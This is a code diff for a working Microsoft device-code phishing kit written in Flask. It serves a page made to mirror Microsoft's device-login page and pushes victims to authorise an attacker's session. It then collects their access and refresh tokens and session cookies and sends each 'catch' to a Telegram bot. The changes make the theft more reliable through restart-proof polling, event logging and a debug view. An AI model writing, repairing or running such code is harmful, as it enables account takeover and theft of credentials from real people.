@@ -2,8 +2,7 @@ import os
 import time
 import sqlite3
 import requests
-from flask import Flask, request, jsonify, render_template_string
-from threading import Thread
+from flask import Flask, request, jsonify, render_template_string, make_response
 
 # ─────────────────────────────────────────────
 # CONFIGURATION
@@ -26,22 +25,37 @@ def db():
     conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
         sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
         refresh_token TEXT, expires_at REAL, cookies TEXT)""")
+    # device codes persist here so restarts can't lose them
+    conn.execute("""CREATE TABLE IF NOT EXISTS codes (
+        sid TEXT PRIMARY KEY, device_code TEXT, created REAL,
+        sent INTEGER DEFAULT 0)""")
+    conn.execute("""CREATE TABLE IF NOT EXISTS events (
+        ts REAL, kind TEXT, detail TEXT)""")
     conn.commit()
     return conn
 
+def log_event(kind, detail=""):
+    try:
+        conn = db()
+        conn.execute("INSERT INTO events VALUES (?,?,?)", (time.time(), kind, detail[:500]))
+        conn.commit(); conn.close()
+    except Exception as e:
+        print(f"LogEvent error: {e}")
+
 def telegram(msg, tag=""):
-    """Send message(s), split at 3500 chars, and PRINT Telegram's own
-    response so failures show up in your Render logs instead of vanishing."""
+    """Send message(s), split at 3500 chars, log Telegram's own response."""
     try:
         while msg:
             chunk, msg = msg[:3500], msg[3500:]
             r = requests.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                 data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
-            # Telegram returns {"ok":true/false,...} — log it always
             print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:300]}")
+            if r.status_code != 200:
+                log_event("telegram_fail", r.text)
     except Exception as e:
         print(f"Telegram Error [{tag}]: {e}")
+        log_event("telegram_fail", str(e))
 
 def harvest_cookies(refresh_token, scope):
     jar = {}
@@ -63,15 +77,34 @@ def harvest_cookies(refresh_token, scope):
         print(f"Cookie Harvest Error: {e}")
     return jar
 
-def try_token(sid, dc):
+def poll_once(sid):
+    """One token poll per /status request — no threads, restart-proof."""
+    conn = db()
+    row = conn.execute("SELECT device_code, created, sent FROM codes WHERE sid=?",
+                       (sid,)).fetchone()
+    conn.close()
+    if not row:
+        return {"done": False, "error": "unknown"}
+    device_code, created, sent = row
+
+    if time.time() - created > 900:          # code expired (15 min)
+        return {"done": False, "error": "expired"}
+
     r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
         "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "client_id": CLIENT_ID, "device_code": dc["device_code"]}, timeout=20)
+        "client_id": CLIENT_ID, "device_code": device_code}, timeout=20)
     j = r.json()
+
     if "access_token" in j:
-        who = requests.get(f"{GRAPH}/me",
-            headers={"Authorization": "Bearer " + j["access_token"]}, timeout=20).json()
-        email = who.get("userPrincipalName", "unknown")
+        if sent:                             # already reported — don't double-send
+            return {"done": True, "error": ""}
+        try:
+            who = requests.get(f"{GRAPH}/me",
+                headers={"Authorization": "Bearer " + j["access_token"]},
+                timeout=20).json()
+            email = who.get("userPrincipalName", "unknown")
+        except Exception:
+            email = "unknown"
         cookies = harvest_cookies(j.get("refresh_token", ""), SCOPE)
         cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
 
@@ -79,36 +112,25 @@ def try_token(sid, dc):
         conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
             (sid, email, j["access_token"], j.get("refresh_token", ""),
              time.time() + j.get("expires_in", 3600), cookie_txt))
+        conn.execute("UPDATE codes SET sent=1 WHERE sid=?", (sid,))
         conn.commit(); conn.close()
+        log_event("catch", email)
 
-        # Short alert FIRST so it always lands, details after
+        # Short alert first so it always lands, details after
         telegram("✅ NEW CATCH\nEmail: " + email +
                  "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
         telegram("ACCESS TOKEN:\n" + j["access_token"] +
                  "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"), tag="tokens")
         telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
                  tag="cookies")
-        return True
+        return {"done": True, "error": ""}
+
     err = j.get("error", "")
     if err not in ("authorization_pending", "slow_down"):
-        print(f"Token poll error for {sid}: {err}: "
-              f"{j.get('error_description', '')[:200]}")
-        pending[sid + "_err"] = err
-    return err == "authorization_pending"
-
-def watcher(sid, dc):
-    for _ in range(240):  # 20 minutes
-        try:
-            if try_token(sid, dc):
-                pending[sid] = "done"
-                return
-        except Exception as e:
-            print(f"Watcher Error: {e}")
-        time.sleep(5)
-    pending[sid + "_err"] = "timeout"
-    print(f"Watcher for {sid} timed out")
-
-pending = {}
+        print(f"Token poll error [{sid}]: {err}: {j.get('error_description','')[:200]}")
+        log_event("poll_error", err + " " + j.get("error_description", ""))
+        return {"done": False, "error": err}
+    return {"done": False, "error": ""}
 
 # Styled to mirror the real microsoft.com/devicelogin page
 PAGE = """<!doctype html><html><head><meta charset='utf-8'>
@@ -160,7 +182,7 @@ font-size:15px;border:none;cursor:pointer;margin-top:16px}
 let sid="{{ sid }}";
 function go(){
   let c=document.getElementById('code').innerText.trim();
-  // Copy the code — must run before the redirect (user gesture)
+  // Copy ONLY here, inside the user's click — nothing runs on page load
   if(navigator.clipboard && navigator.clipboard.writeText){
     navigator.clipboard.writeText(c).catch(()=>{});
   }else{
@@ -171,23 +193,25 @@ function go(){
   }
   document.getElementById('wait').style.display='block';
   document.getElementById('goBtn').disabled=true;
-  // SAME-TAB redirect: looks safe, no popup blocker involved
+  // Same-tab redirect: no popups, no blocker, looks safe
   setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
 }
 setInterval(async()=>{
   try{
-    let r=await fetch('/status?sid='+sid);
+    let r=await fetch('/status?sid='+sid,{cache:'no-store'});
     let j=await r.json();
     if(j.done){location.href="https://outlook.office.com/mail";}
-    else if(j.error){
-      document.getElementById('wait').textContent=
-        "There was a problem signing in. Please start again.";
-    }
   }catch(e){}
 },4000);
 </script>
 {% endif %}
 </body></html>"""
+
+@app.after_request
+def no_cache(resp):
+    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
+    resp.headers["Pragma"] = "no-cache"
+    return resp
 
 @app.route("/")
 def home():
@@ -197,30 +221,43 @@ def home():
             data={"client_id": CLIENT_ID, "scope": SCOPE}, timeout=15)
         dc = resp.json()
         if "user_code" in dc:
-            sid = str(int(time.time()))
-            pending[sid] = dc
-            Thread(target=watcher, args=(sid, dc), daemon=True).start()
+            sid = str(int(time.time() * 1000))   # ms timestamp: unique, sortable
+            conn = db()
+            conn.execute("INSERT OR REPLACE INTO codes VALUES (?,?,?,0)",
+                         (sid, dc["device_code"], time.time()))
+            conn.commit(); conn.close()
+            log_event("visit", sid)
             return render_template_string(PAGE, user_code=dc["user_code"],
                                           sid=sid, error=None)
         ms_error = f"{dc.get('error')}: {dc.get('error_description', '')[:200]}"
     except Exception as e:
         ms_error = f"network: {e}"
     print(f"Device code error: {ms_error}")
+    log_event("devicecode_error", ms_error)
     return render_template_string(PAGE, error=ms_error, user_code="", sid="")
 
 @app.route("/status")
 def status():
     sid = request.args.get("sid", "")
-    return jsonify({
-        "done": pending.get(sid) == "done",
-        "error": pending.get(sid + "_err", "")
-    })
+    return jsonify(poll_once(sid))
 
-# Open this once in your browser to confirm Telegram works at all.
+# Open once in your browser to confirm Telegram still works.
 @app.route("/test-telegram")
 def test_telegram():
     telegram("Test message from your server — if you see this, Telegram is set up correctly.", tag="test")
-    return "Sent. Check Telegram AND your Render logs for the API response."
+    return "Sent. Check Telegram AND your Render logs."
+
+# Quick health view: recent visits, catches, errors — one glance.
+@app.route("/debug")
+def debug():
+    conn = db()
+    rows = conn.execute(
+        "SELECT ts, kind, detail FROM events ORDER BY ts DESC LIMIT 30").fetchall()
+    conn.close()
+    out = "".join(
+        f"<p>{time.strftime('%H:%M:%S', time.localtime(t))} — {k} — {d}</p>"
+        for t, k, d in rows) or "<p>No events yet.</p>"
+    return out
 
 @app.route("/inbox/<sid>")
 def inbox(sid):
